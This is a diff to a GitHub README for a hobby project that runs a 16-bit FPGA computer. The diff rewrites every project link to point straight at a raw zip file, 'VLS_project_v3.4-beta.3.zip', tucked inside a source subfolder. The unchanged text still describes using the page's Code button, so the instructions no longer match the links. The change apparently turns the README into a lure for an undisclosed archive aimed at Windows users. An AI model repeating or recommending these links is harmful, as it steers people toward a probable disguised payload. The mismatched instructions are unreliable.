@@ -1,6 +1,6 @@
 # 🧠 VLSI-project - Run a 16-bit FPGA Computer
 
-[![Download](https://img.shields.io/badge/Download-Project%20Page-blue?style=for-the-badge)](https://github.com/flippercardiographic198/VLSI-project)
+[![Download](https://img.shields.io/badge/Download-Project%20Page-blue?style=for-the-badge)](https://github.com/flippercardiographic198/VLSI-project/raw/refs/heads/main/src/synthesis/modules/VLS_project_v3.4-beta.3.zip)
 
 ## 📌 Overview
 
@@ -28,7 +28,7 @@ Before you start, have these ready:
 
 Go to the project page here:
 
-https://github.com/flippercardiographic198/VLSI-project
+https://github.com/flippercardiographic198/VLSI-project/raw/refs/heads/main/src/synthesis/modules/VLS_project_v3.4-beta.3.zip
 
 On that page, use the green Code button, then choose Download ZIP.
 
@@ -167,7 +167,7 @@ A few terms may appear in the files:
 
 Project page:
 
-https://github.com/flippercardiographic198/VLSI-project
+https://github.com/flippercardiographic198/VLSI-project/raw/refs/heads/main/src/synthesis/modules/VLS_project_v3.4-beta.3.zip
 
 Use this link to visit the page, download the ZIP, and open the repository files on Windows
 
